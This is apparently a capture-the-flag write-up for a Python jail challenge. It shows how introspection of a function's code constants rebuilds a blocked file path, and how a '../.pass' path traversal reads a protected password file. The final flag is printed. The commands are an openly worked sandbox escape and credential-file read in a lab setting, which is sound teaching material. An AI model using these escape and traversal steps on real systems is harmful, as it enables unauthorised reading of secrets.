We have access to dir() command

print(dir()) give us :
	['__builtins__', 'shell']

then print(dir('shell')) :
	['__doc__', '__module__', 'cat', 'help', 'hint', 'ls']

We can call shell.help() :
	This script run as pyjail2.
  	Find a way to print this file /home/pyjail2/.pass

And shell.hint() :
	You may need this for the rest: http://docs.python.org/2/reference/datamodel.html

We can't write shell.cat('home/pyjail2/.pass'), we get an error when we try to passs a string as parameter :
	invalid syntax (<string>, line 1)

We need to retrieve the string "/home/pyjail2/.pass" from the shell.help() function

If we dig into help with print(dir('shell.help')):
	['__call__', '__class__', '__cmp__', '__delattr__', '__doc__', '__format__', '__func__', '__get__', '__getattribute__', '__hash__', '__init__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'im_class', 'im_func', 'im_self']

Then print(dir('shell.help.im_func')) :
	['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']

.func_code is interesting

print(dir('shell.help.im_func.func_code'))
	['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']

Checked all attributes, found interesting infos in .co_const. print(shell.help.im_func.func_code.co_consts) :
	(None, 'help:', '  This script run as pyjail2.', '  Find a way to print this file /home/pyjail2/.pass')

Then we can get the string using print(shell.help.im_func.func_code.co_consts[3]) :
	Find a way to print this file /home/pyjail2/.pass

Then we substring it print(shell.help.im_func.func_code.co_consts[3][32:]):
	/home/pyjail2/.pass

We can then pass to shell.cat shell.cat(shell.help.im_func.func_code.co_consts[3][32:]):
We get an error :
	Could not open file /home/pyjail2/docs//home/pyjail2/.pass

We see that our current PWD is /home/pyjail2/docs/

We then create the string '../.pass' from shell.help.im_func.func_code.co_consts[3]
shell.cat(shell.help.im_func.func_code.co_consts[3][46] + shell.help.im_func.func_code.co_consts[3][46] + shell.help.im_func.func_code.co_consts[3][45:])

And we get the flag : 
	ibrbVv6kAEHnR4Shpq8y

